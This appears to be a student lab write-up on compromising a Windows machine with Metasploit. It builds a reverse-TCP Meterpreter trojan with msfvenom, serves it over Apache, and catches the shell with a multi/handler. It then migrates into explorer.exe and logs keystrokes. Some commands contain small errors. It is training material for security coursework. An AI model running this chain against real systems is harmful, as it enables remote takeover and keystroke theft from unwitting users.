### Date:
# Ex-6: Compromising-windows-using-Metasploit
Compromising windows using Metasploit
### Metasploit
Compromising windows using Metasploit

## AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## PROGRAM:
Find the attackers ip address using ifconfig
### OUTPUT:

![1)](https://github.com/user-attachments/assets/f0805f25-2b83-464d-ab47-c4fc99414248)


Create a malicious executable file fun.exe using msenom command
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
### OUTPUT

![2)](https://github.com/user-attachments/assets/5ed26998-335c-4c81-b80d-e61daa7a50ce)


copy the fun.exe into the apache /var/www/html folder


![3)](https://github.com/user-attachments/assets/c2461816-5137-45aa-ab2d-366f1639fd2b)


Start apache server
sudo systemctl apache2 start

![4)](https://github.com/user-attachments/assets/502183a0-9ae5-4ce0-b799-d669e9ae954e)


Check the status of apache2

![5)](https://github.com/user-attachments/assets/0d8d0328-a39f-4795-b589-78643b301834)

Invoke msfconsole:
### OUTPUT:
Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

Starting a command and control Server
use multi/handler

![6)](https://github.com/user-attachments/assets/ea687bb8-b003-441e-a1f6-05c2ad35d12e)



set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
exploit


On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
http://192.168.1.2/fun.exe
The file "fun.exe" downloads. 

![7)](https://github.com/user-attachments/assets/8196bb53-4ddc-4e6a-8d33-99488787e379)


Bypass any warning boxes, double-click the file, and allow it to run.

On kali give the command exploit

![8)](https://github.com/user-attachments/assets/2de61159-cad8-452d-a933-d07914aa418d)


To see a list of processes, at the meterpreter > prompt, execute this command:
ps  ⇒ can see the fun.exe process running with pid 1156

![9)](https://github.com/user-attachments/assets/dc8de406-d4a3-440d-9966-f7578a524f33)



The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost.
To become more persistent, we'll migrate to a process that will last longer.
Let's migrate to the winlogon process.
At the meterpreter > prompt, execute this command:

migrate -N explorer.exe
at meterpreter > prompt, execute this command:
netstat
A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below.
Notice the "PID/Program name" value for this connection, which is redacted 

![Uploading 10).png…]()



Post Exploitation
The target is now owned. Following are meterpreter commands for key capturing in the target machine
keyscan_start	Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.

![11)](https://github.com/user-attachments/assets/4098d1e3-0394-4012-b817-5bef3e99c744)


keyscan_dump	Shows the keystrokes captured so far

![12)](https://github.com/user-attachments/assets/7bb28d80-71b8-4664-a907-b8c9cd424fd3)


## RESULT:
The Metasploit framework for reconnaissance is  examined successfully
